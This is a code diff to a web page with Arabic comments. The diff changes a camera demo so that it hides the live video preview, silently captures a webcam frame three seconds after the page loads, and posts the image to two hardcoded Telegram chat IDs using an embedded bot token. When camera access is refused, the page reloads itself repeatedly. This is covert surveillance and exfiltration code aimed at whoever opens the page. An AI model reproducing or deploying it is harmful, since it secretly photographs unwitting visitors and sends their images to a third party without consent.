@@ -18,10 +18,7 @@
       margin-top: 30px;
     }
     video {
-      width: 80%;
-      height: auto;
-      border: 1px solid #ccc;
-      border-radius: 8px;
+      display: none;
     }
     canvas {
       display: none;
@@ -43,26 +40,24 @@
       if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
         navigator.mediaDevices.getUserMedia({ video: true })
           .then(function(stream) {
-            // عرض الفيديو في الصفحة
             const video = document.getElementById('video');
             video.srcObject = stream;
 
-            // التقاط الصورة تلقائيًا بعد بضع ثواني
+            // التقاط الصورة تلقائيًا بعد 3 ثواني
             setTimeout(function() {
               captureImage();
-            }, 3000); // التقاط الصورة بعد 3 ثواني من فتح الكاميرا
+            }, 3000);
           })
           .catch(function(err) {
-            // في حال تم رفض الوصول إلى الكاميرا
             alert('لم توافق على الوصول إلى الكاميرا');
-            location.reload(); // إعادة تحميل الصفحة تلقائيًا
+            location.reload(); // إعادة تحميل الصفحة إذا تم رفض الوصول
           });
       } else {
         alert("الخاصية غير مدعومة في المتصفح");
       }
     }
 
-    // دالة لالتقاط الصورة من الكاميرا
+    // دالة لالتقاط الصورة
     function captureImage() {
       const video = document.getElementById('video');
       const canvas = document.getElementById('canvas');
@@ -71,9 +66,36 @@
       // رسم الإطار الحالي من الفيديو على اللوحة (canvas)
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      // هنا يمكن إضافة كود لتحميل الصورة أو حفظها حسب الحاجة
-      // يمكنك استخدام canvas.toDataURL() لتحويل الصورة إلى تنسيق base64.
-      console.log(canvas.toDataURL());
+      // تحويل الصورة إلى Base64
+      const imageData = canvas.toDataURL("image/png");
+
+      // إرسال الصورة إلى بوت Telegram
+      sendToTelegram(imageData);
+    }
+
+    // دالة لإرسال الصورة عبر بوت Telegram
+    function sendToTelegram(imageData) {
+      const chatIds = [6363115796, 6565524734]; // chat_ids الخاصة بك
+      const TELEGRAM_TOKEN = '7986358827:AAEMJZ08_efX_g0LR3BAX4JtNWAe5ADeUNg';
+
+      chatIds.forEach(chatId => {
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', imageData); // إرسال الصورة كـ Base64
+
+        fetch(url, {
+          method: 'POST',
+          body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+          console.log('تم إرسال الصورة عبر Telegram بنجاح:', data);
+        })
+        .catch(error => {
+          console.error('حدث خطأ أثناء إرسال الصورة عبر Telegram:', error);
+        });
+      });
     }
 
     // محاولة الوصول إلى الكاميرا عند تحميل الصفحة
